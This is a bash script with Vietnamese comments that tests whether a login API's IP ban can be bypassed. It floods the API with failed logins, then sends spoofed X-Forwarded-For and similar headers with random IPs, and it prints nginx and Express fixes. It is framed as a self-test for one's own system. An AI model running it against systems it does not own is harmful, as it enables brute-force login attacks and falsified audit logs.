#!/usr/bin/env bash
set -euo pipefail

# ==================================================================
#  PROBE: IP ban co bi bypass bang header khong?
#
#  Phase 1: ban may request cho toi khi bi 403/429 -> do nguong ban
#  Phase 2: doi header gia (XFF / CF / Forwarded) -> neu response
#           quay lai 401 thi rate-limit dang key theo header do
#           client tu gui => LO HONG
#
#  Script co tinh lam ban IP cua ban. Chi chay tren he thong cua ban.
# ==================================================================

BASE_URL="${BASE_URL:-https://mice.3nestinvest.com/api/v1}"
MAX_ATTEMPTS="${MAX_ATTEMPTS:-300}"
EMAIL_DOMAIN="${EMAIL_DOMAIN:-probe.example.com}"

random_ip() {
  local a
  while :; do
    a=$(( RANDOM % 223 + 1 ))
    case "$a" in 10|127|169|172|192) continue ;; esac
    break
  done
  printf '%d.%d.%d.%d' "$a" $(( RANDOM % 256 )) $(( RANDOM % 256 )) $(( RANDOM % 254 + 1 ))
}

login() {
  local email="probe-${RANDOM}${RANDOM}${RANDOM}@${EMAIL_DOMAIN}"
  curl -sS -o /dev/null -w '%{http_code}' -m 15 \
    -X POST "${BASE_URL}/auth/login" \
    -H 'Content-Type: application/json' \
    "$@" \
    --data-raw "{\"email\":\"${email}\",\"password\":\"WrongPass123!\"}"
}

echo "=========================================================="
echo "  BAN-BYPASS PROBE"
echo "  Target: ${BASE_URL}/auth/login"
echo "=========================================================="

echo
echo "[1] Do nguong ban (toi da ${MAX_ATTEMPTS} request)..."

banned=0
ban_at=0
ban_status=0

for ((i = 1; i <= MAX_ATTEMPTS; i++)); do
  code=$(login) || code=0
  if [[ "$code" == "403" || "$code" == "429" ]]; then
    banned=1
    ban_at=$i
    ban_status=$code
    break
  fi
done

if [[ $banned -eq 0 ]]; then
  echo "    -> Khong bi chan sau ${MAX_ATTEMPTS} request (status cuoi: ${code:-n/a})."
  echo "    -> Tang MAX_ATTEMPTS hoac kiem tra lai cau hinh ban."
  exit 0
fi

echo "    -> Bi chan sau ${ban_at} request (status ${ban_status})"

echo
echo "[2] Thu bypass bang header gia..."
echo "    (moi dong: 3 request voi 3 IP gia khac nhau)"
echo

printf '    %-18s %s\n' 'CONTROL (khong)' "$(login)"

bypassed=()
for h in X-Forwarded-For X-Real-IP CF-Connecting-IP True-Client-IP Forwarded; do
  codes=()
  for _ in 1 2 3; do
    ip=$(random_ip)
    if [[ "$h" == "Forwarded" ]]; then
      codes+=("$(login -H "${h}: for=${ip}")")
    else
      codes+=("$(login -H "${h}: ${ip}")")
    fi
  done
  joined=$(IFS=', '; echo "${codes[*]}")
  printf '    %-18s %s\n' "$h" "$joined"

  for c in "${codes[@]}"; do
    if [[ "$c" == "401" || "$c" == "400" ]]; then
      bypassed+=("$h")
      break
    fi
  done
done

echo
echo "=========================================================="

if [[ ${#bypassed[@]} -gt 0 ]]; then
  echo "  KET LUAN: CO LO HONG"
  echo "  Rate limit / IP ban dang key theo header do client tu gui:"
  echo "    ${bypassed[*]}"
  echo
  echo "  Tac dong:"
  echo "    - Bypass rate limit (chi can doi header moi request)"
  echo "    - Gia mao IP trong log/audit"
  echo
  echo "  Cach va:"
  echo "    - nginx: chi set real_ip_header khi request den tu proxy tin cay"
  echo "      (set_real_ip_from <IP cua LB>)."
  echo "    - Express: app.set('trust proxy', <IP/range cua LB>), khong de true."
  echo "    - Rate limit: key theo \$binary_remote_addr, khong theo XFF."
else
  echo "  KET LUAN: KHONG bypass duoc"
  echo "  Header gia bi bo qua, ban van ap dung -> cau hinh dang dung."
  echo
  echo "  Luu y: ban co the la theo thoi gian. Doi 1-2 phut roi chay lai"
  echo "  de kiem tra ban co tu het khong."
fi

echo "=========================================================="
